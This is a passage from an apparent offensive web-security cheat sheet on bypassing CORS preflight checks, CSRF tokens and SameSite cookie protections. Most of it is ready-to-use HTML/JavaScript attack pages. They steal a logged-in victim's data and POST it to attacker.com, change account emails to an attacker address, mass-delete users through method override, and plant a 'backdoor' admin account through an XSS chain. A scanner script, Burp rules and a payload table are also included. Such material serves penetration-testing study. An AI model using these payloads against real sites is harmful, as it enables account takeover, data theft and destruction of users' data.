    fetch('https://attacker.com/fallback', {
      method: 'POST',
      body: JSON.stringify({ auth: 'cookie-only', data: data })
    });
  } catch(e) {
    console.log('[-] Cookie-only auth failed:', e);
  }
}
testAuthFallback();
</script>
```

::

### Smuggling Data Through Safelisted Headers

```html [Data in Accept / Accept-Language Headers]
<!DOCTYPE html>
<html>
<body>
<script>
// In edge cases, data can be smuggled through safelisted headers
// These don't trigger preflight

// Smuggle a command in Accept header
fetch('https://target.com/api/action', {
  method: 'POST',
  credentials: 'include',
  headers: {
    'Content-Type': 'text/plain',
    'Accept': 'application/json',  // Safelisted
    'Accept-Language': 'en-US',    // Safelisted
    'Content-Language': 'en'       // Safelisted
  },
  body: JSON.stringify({ action: 'delete_all' })
});

// Note: Cannot smuggle arbitrary data in safelisted headers
// They have value restrictions (no CORS-unsafe bytes)
// But they can influence server behavior (content negotiation)
</script>
</body>
</html>
```

### Anti-CSRF Token Bypass

::tabs

:::tabs-item{icon="i-lucide-shield-off" label="CSRF Token Not Required"}

```html [Test Without CSRF Token]
<script>
// Test if server enforces CSRF token on cross-origin requests
// Many APIs skip CSRF validation for non-browser clients
// or only check it with application/json Content-Type

fetch('https://target.com/api/settings', {
  method: 'POST',
  credentials: 'include',
  headers: { 'Content-Type': 'text/plain' },  // No preflight
  body: JSON.stringify({
    email: 'attacker@evil.com'
    // No CSRF token — will the server accept it?
  })
}).then(r => {
  console.log('Status:', r.status);
  return r.text();
}).then(d => console.log('Response:', d));
</script>
```

:::

:::tabs-item{icon="i-lucide-key" label="CSRF Token in Cookie"}

```html [Double-Submit Cookie CSRF Bypass]
<script>
// If CSRF uses double-submit cookie pattern:
// Server checks: cookie csrf_token === body csrf_token
// Cross-origin can read cookie if SameSite=None

// Some frameworks set CSRF token in a readable cookie
// The cookie is automatically sent — just need to match it in body
// This works if SameSite attribute is None or not set

// Read CSRF cookie (only works same-site or SameSite=None)
// Cross-origin: can't read cookies, but can SEND them
// If server only checks presence, not value matching:
fetch('https://target.com/api/settings', {
  method: 'POST',
  credentials: 'include',
  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
  body: 'email=attacker@evil.com&csrf_token=anything'
  // Server may not validate CSRF token value properly
});
</script>
```

:::

:::tabs-item{icon="i-lucide-refresh-cw" label="Fetch Token Then Use"}

```html [CORS to Fetch CSRF Token]
<script>
// If CORS misconfiguration allows reading responses:
// Step 1: Fetch page/API to get CSRF token
// Step 2: Use token in state-changing request

async function bypassCSRF() {
  // Step 1: Get CSRF token from API or page
  const tokenResp = await fetch('https://target.com/api/csrf-token', {
    credentials: 'include'
    // Simple GET — no preflight needed
  });
  
  let csrfToken;
  try {
    const tokenData = await tokenResp.json();
    csrfToken = tokenData.csrf_token || tokenData.token || tokenData._token;
  } catch(e) {
    // Try extracting from HTML
    const html = await tokenResp.text();
    const match = html.match(/csrf[_-]?token[^'"]*['"]([^'"]+)/i);
    csrfToken = match ? match[1] : '';
  }
  
  console.log('[*] CSRF Token:', csrfToken);
  
  // Step 2: Use token in action (text/plain to avoid preflight)
  const actionResp = await fetch('https://target.com/api/settings', {
    method: 'POST',
    credentials: 'include',
    headers: { 'Content-Type': 'text/plain' },
    body: JSON.stringify({
      email: 'attacker@evil.com',
      csrf_token: csrfToken
    })
  });
  
  console.log('[*] Action response:', await actionResp.text());
}

bypassCSRF();
</script>
```

:::

::

---

## GET-Based Exploitation

### GET Requests as Simple Requests

::note
GET requests are always "simple" — they never trigger preflight regardless of headers (as long as headers are safelisted). If the server performs state-changing operations on GET endpoints or returns sensitive data, no preflight bypass is needed.
::

::code-group

```html [GET Data Theft (Always Works)]
<!DOCTYPE html>
<html>
<body>
<script>
// GET is ALWAYS simple — no preflight ever
// If server returns ACAO for attacker origin with credentials

// Method 1: fetch
fetch('https://target.com/api/me', {
  credentials: 'include'
}).then(r => r.json()).then(d => {
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify(d)
  });
});

// Method 2: Script tag (no CORS needed for loading, but can't read response)
// Useful for JSONP endpoints
var s = document.createElement('script');
s.src = 'https://target.com/api/me?callback=exfil';
document.body.appendChild(s);
function exfil(data) {
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify(data)
  });
}

// Method 3: Image tag timing (side-channel)
var img = new Image();
var start = Date.now();
img.onload = function() {
  var time = Date.now() - start;
  // Timing can reveal if user is authenticated
  fetch('https://attacker.com/timing?t=' + time);
};
img.onerror = function() {
  fetch('https://attacker.com/timing?error=true');
};
img.src = 'https://target.com/api/me';
</script>
</body>
</html>
```

```html [GET State-Changing Actions]
<!-- If server accepts state-changing GET requests -->
<script>
// Delete via GET (vulnerable API design)
fetch('https://target.com/api/users/1/delete', {
  credentials: 'include'
});

// Admin action via GET
fetch('https://target.com/admin/make-admin?user=attacker', {
  credentials: 'include'
});

// Transfer via GET
fetch('https://target.com/api/transfer?to=attacker&amount=10000', {
  credentials: 'include'
});

// Image tag for GET requests (works even without JS, no CORS)
new Image().src = 'https://target.com/api/users/1/delete';
new Image().src = 'https://target.com/api/transfer?to=attacker&amount=10000';
</script>

<!-- No-JS variant (CSS/HTML only) -->
<img src="https://target.com/api/users/1/delete" style="display:none">
<img src="https://target.com/api/transfer?to=attacker&amount=10000" style="display:none">
```

::

---

## HEAD Request Exploitation

```html [HEAD Request Bypass]
<!DOCTYPE html>
<html>
<body>
<script>
// HEAD is a simple method — no preflight
// Server processes the request but returns no body
// Useful for state-changing side effects or timing attacks

// HEAD request with credentials
fetch('https://target.com/api/me', {
  method: 'HEAD',
  credentials: 'include'
}).then(r => {
  // Can read headers but not body
  console.log('Content-Length:', r.headers.get('content-length'));
  console.log('Content-Type:', r.headers.get('content-type'));
  console.log('Status:', r.status);
  
  // Exposed headers (if Access-Control-Expose-Headers set)
  console.log('X-User-ID:', r.headers.get('x-user-id'));
  console.log('X-Rate-Limit:', r.headers.get('x-rate-limit'));
  
  // Exfiltrate header-based information
  var headers = {};
  r.headers.forEach((v, k) => headers[k] = v);
  fetch('https://attacker.com/headers', {
    method: 'POST',
    body: JSON.stringify(headers)
  });
});
</script>
</body>
</html>
```

---

## Flash / PDF / Silverlight Legacy Vectors

::caution
These techniques target legacy browser plugins that are deprecated/removed from modern browsers. They remain relevant for internal applications or environments running older software.
::

::tabs

:::tabs-item{icon="i-lucide-file" label="crossdomain.xml Abuse"}

```bash [crossdomain.xml Discovery]
# Flash crossdomain.xml — allows cross-origin requests from Flash
curl -s https://target.com/crossdomain.xml
curl -s https://target.com/crossdomain.xml | grep -i "allow-access"

# Check for overly permissive policies
curl -s https://target.com/crossdomain.xml | grep -i 'domain="\*"'

# Common locations
for path in /crossdomain.xml /crossdomain.xml.bak /static/crossdomain.xml; do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com${path}")
  [ "$CODE" = "200" ] && echo "[+] Found: https://target.com${path}"
done
```

```xml [Vulnerable crossdomain.xml Examples]
<!-- Allows ALL domains — fully open -->
<?xml version="1.0"?>
<cross-domain-policy>
  <allow-access-from domain="*"/>
</cross-domain-policy>

<!-- Allows with credentials -->
<?xml version="1.0"?>
<cross-domain-policy>
  <allow-access-from domain="*" secure="false"/>
  <allow-http-request-headers-from domain="*" headers="*"/>
</cross-domain-policy>
```

:::

:::tabs-item{icon="i-lucide-file" label="clientaccesspolicy.xml"}

```bash [Silverlight Policy Discovery]
# Silverlight clientaccesspolicy.xml
curl -s https://target.com/clientaccesspolicy.xml
curl -s https://target.com/clientaccesspolicy.xml | grep -i "allow-from"

# Check for overly permissive
curl -s https://target.com/clientaccesspolicy.xml | grep -i 'http-request-headers="\*"'
```

```xml [Vulnerable clientaccesspolicy.xml]
<?xml version="1.0" encoding="utf-8"?>
<access-policy>
  <cross-domain-access>
    <policy>
      <allow-from http-request-headers="*">
        <domain uri="*"/>
      </allow-from>
      <grant-to>
        <resource path="/" include-subpaths="true"/>
      </grant-to>
    </policy>
  </cross-domain-access>
</access-policy>
```

:::

::

---

## SameSite Cookie Interaction

### SameSite Impact on Preflight Bypass

```text [SameSite Cookie Behavior with CORS]
┌──────────────────────────────────────────────────────────────────┐
│  SameSite=None; Secure                                          │
│  ├── Cookies sent on ALL cross-origin requests                  │
│  ├── credentials: 'include' works from any origin               │
│  └── Preflight bypass = full exploitation ✅                    │
│                                                                  │
│  SameSite=Lax (default in modern browsers)                      │
│  ├── Cookies sent on cross-origin GET navigations (top-level)   │
│  ├── Cookies NOT sent on cross-origin POST/fetch                │
│  ├── credentials: 'include' fetch → NO cookies ❌               │
│  ├── Top-level GET navigation → cookies sent ✅                 │
│  ├── <a href> click → cookies sent ✅                           │
│  ├── window.open() → cookies sent ✅                            │
│  ├── <form method=GET> → cookies sent ✅                        │
│  ├── <form method=POST> → cookies NOT sent ❌                   │
│  └── Preflight bypass: only works for top-level GET navigations │
│                                                                  │
│  SameSite=Strict                                                │
│  ├── Cookies NEVER sent on cross-origin requests                │
│  ├── Not even on top-level navigations                          │
│  ├── Only sent when user is already on the same site            │
│  └── Preflight bypass: NOT exploitable cross-origin ❌          │
└──────────────────────────────────────────────────────────────────┘
```

### Exploiting SameSite=Lax with Top-Level Navigation

::code-group

```html [GET via window.open (Lax)]
<!DOCTYPE html>
<html>
<body>
<script>
// SameSite=Lax: cookies sent on top-level GET navigation
// window.open creates top-level navigation

// Open target API in new window — cookies are sent!
var popup = window.open('https://target.com/api/me');

// Wait for it to load, then try to read (requires ACAO)
setTimeout(function() {
  try {
    // This will fail unless ACAO allows attacker origin
    // But the GET request itself was sent WITH cookies
    var data = popup.document.body.innerText;
    fetch('https://attacker.com/lax', {
      method: 'POST',
      body: data
    });
  } catch(e) {
    console.log('Cannot read (SOP), but request was sent with cookies');
  }
  popup.close();
}, 3000);
</script>
</body>
</html>
```

```html [GET via Anchor Click (Lax)]
<!-- SameSite=Lax allows cookies on <a> navigation -->
<!DOCTYPE html>
<html>
<body>
<a id="exploit" href="https://target.com/api/delete-account?confirm=true">
  Click here for your prize!
</a>
<script>
// Auto-click (may be blocked by popup blockers)
// document.getElementById('exploit').click();

// Better: social engineer the click
// Or use:
// location.href = 'https://target.com/api/delete-account?confirm=true';
</script>
</body>
</html>
```

```html [GET via Form (Lax)]
<!-- SameSite=Lax allows cookies on top-level GET form submission -->
<form id="exploit" action="https://target.com/api/settings" method="GET">
  <input type="hidden" name="email" value="attacker@evil.com">
  <input type="hidden" name="action" value="update">
</form>
<script>document.getElementById('exploit').submit();</script>
<!-- Cookies ARE sent because it's a top-level GET navigation -->
```

::

### Chrome 2-Minute Lax Exception

::note
Chrome has a special behavior: for the first 2 minutes after a cookie is set, `SameSite=Lax` cookies are also sent on cross-site POST requests via top-level navigation. This is designed to prevent breakage of SSO flows but creates a brief exploitation window.
::

```html [Chrome 2-Minute Lax POST Window]
<!DOCTYPE html>
<html>
<body>
<!-- If victim just logged in (within 2 minutes), POST with cookies works -->
<form id="exploit" action="https://target.com/api/settings" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>
// Auto-submit POST form — cookies sent if within 2-min window
document.getElementById('exploit').submit();
// This is a top-level form POST navigation
// Chrome allows Lax cookies for first 2 minutes
</script>
</body>
</html>
```

---

## Chaining Techniques

### Preflight Bypass + CORS Misconfiguration

```text [Combined Exploitation Chain]
┌──────────────────────────────────────────────────────────┐
│  Scenario: Server has CORS misconfiguration              │
│  - Reflects Origin in ACAO                               │
│  - Credentials: true                                     │
│  - BUT: only validates CORS on OPTIONS preflight         │
│  - Does NOT check Origin on actual GET/POST requests     │
│                                                          │
│  Attack:                                                 │
│  1. Craft request as "simple" (text/plain POST)          │
│  2. Browser skips OPTIONS entirely                       │
│  3. Server processes request with cookies                │
│  4. Server reflects Origin in ACAO on actual response    │
│  5. Attacker reads response ✅                          │
│                                                          │
│  Even if OPTIONS handler was properly configured          │
│  to reject evil origins — it never gets called!          │
└──────────────────────────────────────────────────────────┘
```

::tabs

:::tabs-item{icon="i-lucide-swords" label="Read + Write Attack"}

```html [Combined Read + Write Exploit]
<!DOCTYPE html>
<html>
<body>
<script>
async function exploit() {
  // Step 1: Read sensitive data (GET = always simple)
  const userData = await fetch('https://target.com/api/me', {
    credentials: 'include'
  }).then(r => r.json());
  
  console.log('[*] User data:', userData);
  
  // Step 2: Read CSRF token (GET = always simple)
  const csrfData = await fetch('https://target.com/api/csrf', {
    credentials: 'include'
  }).then(r => r.json());
  
  // Step 3: Perform state-changing action
  // Using text/plain to bypass preflight for POST
  const result = await fetch('https://target.com/api/settings', {
    method: 'POST',
    credentials: 'include',
    headers: { 'Content-Type': 'text/plain' },
    body: JSON.stringify({
      email: 'attacker@evil.com',
      csrf_token: csrfData.token
    })
  }).then(r => r.text());
  
  // Step 4: Exfiltrate everything
  fetch('https://attacker.com/full-chain', {
    method: 'POST',
    body: JSON.stringify({
      user: userData,
      csrf: csrfData,
      action_result: result
    })
  });
}

exploit();
</script>
</body>
</html>
```

:::

:::tabs-item{icon="i-lucide-swords" label="Method Override Chain"}

```html [DELETE via Method Override + Preflight Bypass]
<!DOCTYPE html>
<html>
<body>
<script>
async function chain() {
  // Step 1: Steal admin user list (GET, no preflight)
  const users = await fetch('https://target.com/api/admin/users', {
    credentials: 'include'
  }).then(r => r.json());
  
  // Step 2: Delete target user via method override
  // POST + _method=DELETE = simple request (no preflight)
  for (const user of users.data) {
    if (user.role !== 'admin') {
      await fetch('https://target.com/api/admin/users/' + user.id + '?_method=DELETE', {
        method: 'POST',
        credentials: 'include',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: '_method=DELETE'
      });
      console.log('[*] Deleted user:', user.id);
    }
  }
  
  // Step 3: Report success
  fetch('https://attacker.com/chain-complete', {
    method: 'POST',
    body: JSON.stringify({ deleted_users: users.data.length })
  });
}

chain();
</script>
</body>
</html>
```

:::

:::tabs-item{icon="i-lucide-swords" label="GraphQL Preflight Bypass"}

```html [GraphQL with text/plain]
<!DOCTYPE html>
<html>
<body>
<script>
// GraphQL typically requires Content-Type: application/json (triggers preflight)
// Some GraphQL servers also accept GET with query parameter
// or POST with text/plain containing JSON

// Method 1: GET with query parameter (always simple)
fetch('https://target.com/graphql?query=' + encodeURIComponent(`
  {
    me {
      id email name role apiKey
      organization { name members { email role } }
    }
  }
`), {
  credentials: 'include'
}).then(r => r.json()).then(d => {
  fetch('https://attacker.com/gql', { method: 'POST', body: JSON.stringify(d) });
});

// Method 2: POST with text/plain (no preflight)
fetch('https://target.com/graphql', {
  method: 'POST',
  credentials: 'include',
  headers: { 'Content-Type': 'text/plain' },
  body: JSON.stringify({
    query: `{ me { id email name role apiKey } }`
  })
}).then(r => r.json()).then(d => {
  fetch('https://attacker.com/gql2', { method: 'POST', body: JSON.stringify(d) });
});

// Method 3: POST with application/x-www-form-urlencoded
fetch('https://target.com/graphql', {
  method: 'POST',
  credentials: 'include',
  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
  body: 'query=' + encodeURIComponent('{ me { id email role apiKey } }')
}).then(r => r.json()).then(d => {
  fetch('https://attacker.com/gql3', { method: 'POST', body: JSON.stringify(d) });
});

// Method 4: Mutation via GET (some servers allow)
fetch('https://target.com/graphql?query=' + encodeURIComponent(`
  mutation {
    updateUser(email: "attacker@evil.com") {
      id email
    }
  }
`), {
  credentials: 'include'
}).then(r => r.json()).then(d => console.log('Mutation result:', d));
</script>
</body>
</html>
```

:::

::

### Preflight Bypass + XSS Chain

```html [XSS on Subdomain + Preflight Bypass for API]
<!-- Inject this via XSS on any subdomain -->
<script>
// XSS context: blog.target.com
// API: api.target.com
// API requires Content-Type: application/json for POST
// API CORS only allows *.target.com (subdomain trust)
// BUT API's OPTIONS handler properly blocks non-whitelisted subdomains... 
// Doesn't matter! text/plain POST skips OPTIONS entirely

fetch('https://api.target.com/api/admin/create-user', {
  method: 'POST',
  credentials: 'include',
  headers: { 'Content-Type': 'text/plain' },
  body: JSON.stringify({
    username: 'backdoor',
    password: 'P@ss123!',
    role: 'admin'
  })
}).then(r => r.json()).then(d => {
  fetch('https://attacker.com/subdomain-chain', {
    method: 'POST',
    body: JSON.stringify(d)
  });
});
</script>
```

---

## Server-Side Parser Behavior

### Why Content-Type text/plain Works with JSON

::collapsible

| Framework / Server | Behavior with text/plain + JSON body | Exploitable? |
| --- | --- | --- |
| Express.js + `express.json()` | ❌ Rejects — only parses `application/json` | No (default) |
| Express.js + `body-parser({type:'*/*'})` | ✅ Parses any Content-Type as JSON | Yes |
| Express.js + custom middleware | Depends on `type` option | Test needed |
| Spring Boot (default) | ❌ Rejects — needs `application/json` | No (default) |
| Spring Boot + `@RequestBody` with relaxed config | ✅ May parse based on body content | Yes |
| Django REST Framework | ❌ Rejects — Content-Type must match parser | No (default) |
| Django REST + custom parser | ✅ If custom parser accepts text/plain | Yes |
| Flask | Depends on `request.get_json(force=True)` | ✅ if `force=True` |
| FastAPI | ❌ Rejects — validates Content-Type | No |
| Laravel (PHP) | ✅ `$request->json()` works regardless of CT | Yes |
| Symfony (PHP) | ✅ `json_decode(file_get_contents('php://input'))` | Yes |
| Ruby on Rails | ✅ ActionDispatch may auto-detect JSON | Yes (often) |
| ASP.NET Core | ❌ Default — needs application/json | No (default) |
| ASP.NET Core + `[Consumes]` relaxed | ✅ If configured to accept any | Yes |
| Go (net/http) | ✅ Manual body parsing ignores Content-Type | Yes (usually) |
| Go (Gin/Echo) | Depends on binding configuration | Test needed |
| Nginx (proxy) | Passes through — backend decides | Backend dependent |
| Apache (proxy) | Passes through — backend decides | Backend dependent |
| AWS API Gateway | Depends on mapping template | Test needed |
| GraphQL servers | Many accept text/plain with JSON body | ✅ Common |

::

### Testing Server JSON Parsing Behavior

```bash [JSON Parsing Behavior Test]
#!/bin/bash
TARGET="https://target.com/api/settings"
COOKIE="session=YOUR_SESSION"
JSON='{"email":"test-cors@test.com"}'

echo "[*] Testing server JSON parsing with various Content-Types"
echo "================================================================"

# Test each simple Content-Type with JSON body
TESTS=(
  "text/plain"
  "text/plain; charset=utf-8"
  "text/plain; charset=UTF-8"
  "application/x-www-form-urlencoded"
  "application/x-www-form-urlencoded; charset=utf-8"
  "multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW"
  ""
)

for ct in "${TESTS[@]}"; do
  if [ -z "$ct" ]; then
    # No Content-Type header
    RESP=$(curl -s "$TARGET" \
      -X POST \
      -H "Cookie: $COOKIE" \
      -d "$JSON" 2>/dev/null)
    CODE=$?
    echo "[*] No Content-Type header:"
  else
    RESP=$(curl -s "$TARGET" \
      -X POST \
      -H "Content-Type: $ct" \
      -H "Cookie: $COOKIE" \
      -d "$JSON" 2>/dev/null)
    echo "[*] Content-Type: $ct"
  fi
  
  # Check if response indicates success
  HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET" \
    -X POST -H "Content-Type: ${ct:-}" -H "Cookie: $COOKIE" -d "$JSON" 2>/dev/null)
  
  echo "    HTTP: $HTTP_CODE"
  echo "    Response: $(echo "$RESP" | head -c 200)"
  echo ""
done

# Also test: does removing Content-Type entirely work?
echo "[*] No Content-Type header at all:"
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET" \
  -X POST -H "Cookie: $COOKIE" -d "$JSON" 2>/dev/null)
echo "    HTTP: $HTTP_CODE"
```

---

## Browser-Specific Quirks

### Browser Behavior Variations

::collapsible

| Browser | Quirk | Impact |
| --- | --- | --- |
| Chrome | 128-byte safelisted header limit | Headers exceeding total 128 bytes trigger preflight |
| Chrome | 2-minute Lax POST exception | POST with Lax cookies works briefly after cookie set |
| Chrome | Strict `Content-Type` parsing | Only exact simple types pass; parameters generally OK |
| Firefox | Slightly different header size limits | May allow larger safelisted headers than Chrome |
| Firefox | `Range` header handling | Different simple range interpretation |
| Safari | Legacy WebKit CORS behavior | Some older versions have looser preflight checks |
| Safari | Third-party cookie blocking | `credentials: 'include'` may fail due to ITP |
| Edge (Chromium) | Same as Chrome | Identical behavior to Chrome |
| IE 11 | Uses `XDomainRequest` (legacy) | No credentials support, limited CORS |
| IE 11 | No preflight for some cases | Older CORS implementation with quirks |
| All modern | `ReadableStream` body | Always triggers preflight |
| All modern | `XMLHttpRequest.upload` listener | Always triggers preflight |
| All modern | `no-cors` mode | Request fires but response opaque (can't read) |

::

### no-cors Mode for Blind CSRF

```html [no-cors Mode — Blind State Changes]
<!DOCTYPE html>
<html>
<body>
<script>
// mode: 'no-cors' sends the request but response is opaque
// Cannot read response, but the request DOES fire with cookies
// Useful for blind state-changing operations (CSRF)

// This sends the request regardless of CORS headers
// Server processes it — attacker just can't read the response
fetch('https://target.com/api/settings', {
  method: 'POST',
  mode: 'no-cors',           // Bypass CORS — but can't read response
  credentials: 'include',     // Send cookies
  headers: {
    'Content-Type': 'text/plain'  // Must be simple for no-cors
  },
  body: JSON.stringify({
    email: 'attacker@evil.com'
  })
}).then(() => {
  console.log('Request sent (response opaque)');
  // Verify success by checking if email was changed
  // e.g., trigger password reset to attacker@evil.com
});

// Note: mode: 'no-cors' restrictions:
// - Only simple methods (GET, HEAD, POST)
// - Only simple headers
// - Only simple Content-Types
// - Response is opaque (can't read status, headers, or body)
// - But the request IS processed by the server!
</script>
</body>
</html>
```

---

## Tooling & Detection

### Automated Preflight Bypass Scanner

```python [preflight_bypass_scanner.py]
#!/usr/bin/env python3
"""
Preflight Bypass Scanner
Tests if endpoints accept simple Content-Types with JSON bodies
and method override techniques
"""

import requests
import json
import sys
from urllib.parse import urljoin

class PreflightBypassScanner:
    def __init__(self, base_url, cookie=None):
        self.base_url = base_url
        self.session = requests.Session()
        if cookie:
            self.session.headers['Cookie'] = cookie
        self.findings = []

    def test_content_type_bypass(self, endpoint, json_body):
        url = urljoin(self.base_url, endpoint)
        print(f"\n[*] Testing Content-Type bypass: {url}")
        
        simple_types = [
            'text/plain',
            'text/plain; charset=utf-8',
            'application/x-www-form-urlencoded',
            'application/x-www-form-urlencoded; charset=utf-8',
            'multipart/form-data; boundary=----Exploit',
        ]
        
        # Baseline: application/json
        try:
            base_resp = self.session.post(url, 
                headers={'Content-Type': 'application/json'},
                data=json.dumps(json_body), timeout=10)
            base_status = base_resp.status_code
            print(f"  Baseline (application/json): HTTP {base_status}")
        except Exception as e:
            print(f"  Baseline error: {e}")
            base_status = 0
        
        for ct in simple_types:
            try:
                resp = self.session.post(url,
                    headers={'Content-Type': ct},
                    data=json.dumps(json_body), timeout=10)
                
                if resp.status_code in [200, 201, 204] or resp.status_code == base_status:
                    print(f"  [+] BYPASS: {ct} → HTTP {resp.status_code}")
                    self.findings.append({
                        'type': 'content_type_bypass',
                        'endpoint': endpoint,
                        'content_type': ct,
                        'status': resp.status_code,
                        'response': resp.text[:200]
                    })
                else:
                    print(f"  [-] Rejected: {ct} → HTTP {resp.status_code}")
            except Exception as e:
                print(f"  [-] Error: {ct} → {e}")
        
        # Test: no Content-Type at all
        try:
            resp = self.session.post(url, data=json.dumps(json_body), timeout=10)
            if resp.status_code in [200, 201, 204]:
                print(f"  [+] BYPASS: No Content-Type → HTTP {resp.status_code}")
                self.findings.append({
                    'type': 'no_content_type',
                    'endpoint': endpoint,
                    'status': resp.status_code
                })
        except:
            pass

    def test_method_override(self, endpoint):
        url = urljoin(self.base_url, endpoint)
        print(f"\n[*] Testing method override: {url}")
        
        override_params = ['_method', 'method', '_METHOD', 'httpMethod', 'http_method']
        override_methods = ['DELETE', 'PUT', 'PATCH']
        
        for param in override_params:
            for method in override_methods:
                # Query parameter
                try:
                    resp = self.session.post(f"{url}?{param}={method}",
                        headers={'Content-Type': 'application/x-www-form-urlencoded'},
                        data='', timeout=10)
                    if resp.status_code not in [404, 405, 400]:
                        print(f"  [+] Override: ?{param}={method} → HTTP {resp.status_code}")
                        self.findings.append({
                            'type': 'method_override_query',
                            'endpoint': endpoint,
                            'param': param,
                            'method': method,
                            'status': resp.status_code
                        })
                except:
                    pass
                
                # Body parameter
                try:
                    resp = self.session.post(url,
                        headers={'Content-Type': 'application/x-www-form-urlencoded'},
                        data=f'{param}={method}', timeout=10)
                    if resp.status_code not in [404, 405, 400]:
                        print(f"  [+] Override: body {param}={method} → HTTP {resp.status_code}")
                        self.findings.append({
                            'type': 'method_override_body',
                            'endpoint': endpoint,
                            'param': param,
                            'method': method,
                            'status': resp.status_code
                        })
                except:
                    pass

    def test_cors_reflection(self, endpoint):
        url = urljoin(self.base_url, endpoint)
        print(f"\n[*] Testing CORS on simple request: {url}")
        
        origins = ['https://evil.com', 'null', 'https://attacker.com']
        
        for origin in origins:
            for ct in ['text/plain', 'application/x-www-form-urlencoded']:
                try:
                    resp = self.session.get(url,
                        headers={'Origin': origin}, timeout=10)
                    acao = resp.headers.get('Access-Control-Allow-Origin', '')
                    acac = resp.headers.get('Access-Control-Allow-Credentials', '')
                    
                    if origin in acao or acao == '*':
                        print(f"  [+] CORS reflects: Origin={origin} → ACAO={acao}, ACAC={acac}")
                        self.findings.append({
                            'type': 'cors_reflection',
                            'endpoint': endpoint,
                            'origin': origin,
                            'acao': acao,
                            'acac': acac
                        })
                except:
                    pass

    def scan(self, endpoints, json_body=None):
        if json_body is None:
            json_body = {"test": "preflight_bypass"}
        
        for ep in endpoints:
            self.test_content_type_bypass(ep, json_body)
            self.test_method_override(ep)
            self.test_cors_reflection(ep)
        
        print(f"\n{'='*60}")
        print(f"[*] Scan complete — {len(self.findings)} findings")
        for f in self.findings:
            print(f"  [{f['type']}] {f.get('endpoint', '')} — {f}")
        
        return self.findings

if __name__ == '__main__':
    base = sys.argv[1]
    cookie = sys.argv[2] if len(sys.argv) > 2 else None
    
    endpoints = ['/api/me', '/api/settings', '/api/users', '/api/data',
                 '/api/profile', '/api/admin', '/graphql', '/api/export']
    
    scanner = PreflightBypassScanner(base, cookie)
    scanner.scan(endpoints)
```

### Burp Suite Workflow

::steps{level="4"}

#### Configure Match & Replace for Origin Testing

```text [Burp Match & Replace Rules]
# Rule 1: Add evil Origin to all requests
Type: Request header
Match: ^Origin:.*$
Replace: Origin: https://evil.com

# Rule 2: Replace Content-Type to test preflight bypass
Type: Request header
Match: ^Content-Type: application/json$
Replace: Content-Type: text/plain

# Rule 3: Add method override parameter
Type: Request first line
Match: ^(POST .+)$
Replace: $1?_method=DELETE
```

#### Use Repeater for Manual Preflight Testing

```http [Repeater — Preflight Test]
POST /api/settings HTTP/1.1
Host: target.com
Origin: https://evil.com
Content-Type: text/plain
Cookie: session=YOUR_SESSION

{"email":"attacker@evil.com"}
```

#### Use Intruder for Content-Type Fuzzing

```text [Intruder Configuration]
Attack type: Sniper
Payload position: Content-Type header value

Payloads:
  text/plain
  text/plain; charset=utf-8
  application/x-www-form-urlencoded
  multipart/form-data; boundary=----x
  TEXT/PLAIN
  text/plain; type=application/json

Grep match: 
  - Success indicators from normal responses
  - "email" (to confirm JSON was parsed)
  - Access-Control-Allow-Origin
```

#### Scan with Logger++ for CORS Headers

```text [Logger++ Filter]
# Filter for responses with CORS headers
Response.headers CONTAINS "Access-Control-Allow-Origin"

# Filter for reflected origins
Response.headers CONTAINS "evil.com"

# Filter for credentials allowed
Response.headers CONTAINS "Access-Control-Allow-Credentials: true"
```

::

---

## Quick Reference

### Preflight Trigger Matrix

::collapsible

| Request Feature | Value | Triggers Preflight? |
| --- | --- | --- |
| Method: GET | — | ❌ No |
| Method: HEAD | — | ❌ No |
| Method: POST | — | ❌ No |
| Method: PUT | — | ✅ Yes |
| Method: DELETE | — | ✅ Yes |
| Method: PATCH | — | ✅ Yes |
| Content-Type | `text/plain` | ❌ No |
| Content-Type | `application/x-www-form-urlencoded` | ❌ No |
| Content-Type | `multipart/form-data` | ❌ No |
| Content-Type | `application/json` | ✅ Yes |
| Content-Type | `application/xml` | ✅ Yes |
| Content-Type | `text/xml` | ✅ Yes |
| Content-Type | `application/graphql` | ✅ Yes |
| Content-Type | `text/plain; charset=utf-8` | ❌ No |
| Header | `Accept` | ❌ No |
| Header | `Accept-Language` | ❌ No |
| Header | `Content-Language` | ❌ No |
| Header | `Authorization` | ✅ Yes |
| Header | `X-Requested-With` | ✅ Yes |
| Header | `X-CSRF-Token` | ✅ Yes |
| Header | `X-Custom-*` | ✅ Yes |
| Header | `Cache-Control` | ✅ Yes |
| Body | `ReadableStream` | ✅ Yes |
| XHR | `upload.addEventListener()` | ✅ Yes |

::

### Bypass Payload Quick Reference

::collapsible

| Bypass Technique | Payload Pattern |
| --- | --- |
| text/plain JSON | `fetch(url, {method:'POST', credentials:'include', headers:{'Content-Type':'text/plain'}, body:JSON.stringify(data)})` |
| form-urlencoded JSON | `fetch(url, {method:'POST', credentials:'include', headers:{'Content-Type':'application/x-www-form-urlencoded'}, body:JSON.stringify(data)})` |
| HTML form text/plain | `<form action=url method=POST enctype=text/plain><input name='{"key":"val","x":"' value='"}'>` |
| HTML form urlencoded | `<form action=url method=POST><input name=key value=val>` |
| Method override query | `fetch(url+'?_method=DELETE', {method:'POST', credentials:'include'})` |
| Method override body | `fetch(url, {method:'POST', credentials:'include', body:'_method=DELETE'})` |
| no-cors blind CSRF | `fetch(url, {method:'POST', mode:'no-cors', credentials:'include', headers:{'Content-Type':'text/plain'}, body:data})` |
| GET state change | `fetch(url+'?action=delete', {credentials:'include'})` |
| GraphQL via GET | `fetch(url+'/graphql?query='+encodeURIComponent(query), {credentials:'include'})` |
| GraphQL text/plain | `fetch(url+'/graphql', {method:'POST', credentials:'include', headers:{'Content-Type':'text/plain'}, body:JSON.stringify({query:q})})` |
| window.open (Lax) | `window.open(url)` — cookies sent for Lax on GET navigation |
| Form GET (Lax) | `<form method=GET action=url><input name=action value=delete>` — Lax cookies sent |
| Multipart JSON | `FormData.append('data', JSON.stringify(payload))` — multipart is simple |

::

---

## References & Resources

